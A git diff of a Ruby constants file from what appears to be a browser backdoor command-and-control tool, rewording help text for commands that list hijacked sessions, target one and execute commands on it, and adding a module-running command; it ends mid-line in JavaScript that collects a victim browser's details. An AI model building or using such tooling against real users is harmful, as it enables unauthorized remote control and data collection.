@@ -15,17 +15,18 @@ module Constants
     "|____/|_|  \\___/ \\_/\\_/ |___/\\___|_|  |____/ \\__,_|\\___|_|\\_\\__,_|\\___/ \\___/|_|\n"\
     "Visit http://imcpwn.com for more information.\n"
     @commands = {
-        "help" => "Help menu",
-        "exit" => "Quit the application",
-        "sessions" => "List active sessions",
-        "target" => "Select targeted session",
-        "info" => "Get session information (IP, User Agent, Operating System, Language)",
-        "exec" => "Execute commands on the targeted session interactively. Provide an argument to execute a file's contents.",
-        "get_cert" => "Get a free TLS certificate from LetsEncrypt",
-        "pry" => "Drop into a Pry session",
-        "clear" => "Clear the console screen",
-        "ls" => "List directory contents",
-        "cat" => "Read the contents of a file"
+        "help" => "Show help menu",
+        "exit" => "Quit the application.",
+        "sessions" => "List active sessions.",
+        "target" => "Select targeted session.",
+        "info" => "Get session information (IP, User Agent, Operating System, Language).",
+        "exec" => "Execute commands on the targeted session interactively. Provide an argument to execute a file's contents (e.g. a module).",
+        "get_cert" => "Get a free TLS certificate from LetsEncrypt.",
+        "pry" => "Drop into a Pry session.",
+        "clear" => "Clear the console screen.",
+        "ls" => "List directory contents.",
+        "cat" => "Read the contents of a file.",
+        "modules" => "List all modules in modules directory. To execute a module use exec MODULE_NAME."
     }.sort
     @infoCommands = {
         "IP" => "var xhttp = new XMLHttpRequest();xhttp.onreadystatechange = function() 
